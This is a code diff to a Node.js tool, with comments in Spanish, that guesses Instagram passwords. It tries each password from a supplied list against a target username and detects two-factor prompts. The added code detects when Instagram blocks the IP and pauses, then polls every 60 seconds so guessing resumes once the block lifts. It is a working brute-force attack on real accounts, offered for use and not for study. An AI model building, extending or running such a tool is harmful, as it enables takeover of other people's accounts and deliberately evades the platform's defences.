@@ -19,6 +19,25 @@ console.log(`[DEBUG] Contraseña de acceso: ${accessPassword}`);
 // Función de retraso
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
+// Variable para rastrear si la IP está bloqueada
+let isIpBlocked = false;
+
+// Función para verificar si la IP está bloqueada
+async function checkIfIpIsBlocked() {
+  const ig = new IgApiClient();
+  try {
+    // Intentar una solicitud simple a la API de Instagram
+    await ig.simulate.preLoginFlow();
+    return false; // La IP no está bloqueada
+  } catch (error) {
+    // Detectar si la IP está bloqueada
+    if (error.message.includes('blocked')) {
+      return true; // La IP está bloqueada
+    }
+    return false; // Otros errores
+  }
+}
+
 // Función para probar una contraseña con reintentos
 async function testPassword(username, password, retries = 3) {
   const ig = new IgApiClient();
@@ -36,6 +55,12 @@ async function testPassword(username, password, retries = 3) {
     return { success: true, password };
   } catch (error) {
     console.error(`[DEBUG] Error con la contraseña ${password}:`, error.message);
+
+    // Detectar si la IP está bloqueada
+    if (error.message.includes('blocked')) {
+      isIpBlocked = true;
+      return { success: false, password, message: 'La IP está bloqueada. Inténtalo de nuevo más tarde.' };
+    }
 
     // Detectar si se requiere un código de 6 dígitos (2FA)
     if (error.message.includes('two_factor_required')) {
@@ -73,6 +98,14 @@ wss.on('connection', (ws) => {
     password: accessPassword,
   }));
 
+  // Verificar si la IP está bloqueada al conectar un nuevo cliente
+  if (isIpBlocked) {
+    ws.send(JSON.stringify({
+      type: 'ipBlocked',
+      message: 'La IP está bloqueada. Inténtalo de nuevo más tarde.',
+    }));
+  }
+
   ws.on('message', async (message) => {
     const data = JSON.parse(message);
 
@@ -88,6 +121,15 @@ wss.on('connection', (ws) => {
     if (data.type === 'startLogin') {
       const { username, passwords } = data;
       let correctPassword = null;
+
+      // Verificar si la IP está bloqueada antes de continuar
+      if (isIpBlocked) {
+        ws.send(JSON.stringify({
+          type: 'ipBlocked',
+          message: 'La IP está bloqueada. Inténtalo de nuevo más tarde.',
+        }));
+        return;
+      }
 
       // Probar cada contraseña línea por línea
       for (let i = 0; i < passwords.length; i++) {
@@ -129,9 +171,33 @@ wss.on('connection', (ws) => {
   });
 });
 
+// Función para verificar periódicamente si la IP sigue bloqueada
+async function checkIpBlockStatus() {
+  while (true) {
+    await delay(60000); // Verificar cada 60 segundos
+    const blocked = await checkIfIpIsBlocked();
+    if (!blocked && isIpBlocked) {
+      isIpBlocked = false;
+      console.log('[DEBUG] La IP ya no está bloqueada.');
+      // Notificar a todos los clientes conectados
+      wss.clients.forEach((client) => {
+        if (client.readyState === WebSocket.OPEN) {
+          client.send(JSON.stringify({
+            type: 'ipUnblocked',
+            message: 'La IP ya no está bloqueada. Puedes continuar.',
+          }));
+        }
+      });
+    }
+  }
+}
+
 // Iniciar el servidor
 const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => {
   console.log(`[DEBUG] Servidor ejecutándose en http://localhost:${PORT}`);
   console.log(`[DEBUG] Contraseña de acceso: ${accessPassword}`);
 });
+
+// Iniciar la verificación periódica del estado de la IP
+checkIpBlockStatus();
